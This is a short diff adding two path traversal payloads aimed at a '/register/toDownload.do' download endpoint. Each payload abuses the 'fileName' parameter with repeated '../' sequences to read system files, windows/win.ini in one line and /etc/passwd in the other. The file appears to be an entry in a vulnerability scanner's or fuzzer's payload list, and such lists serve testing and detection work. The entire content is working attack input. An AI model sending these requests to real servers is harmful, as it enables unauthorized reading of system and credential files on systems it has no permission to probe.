@@ -1,0 +1,2 @@
+/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
+/register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd
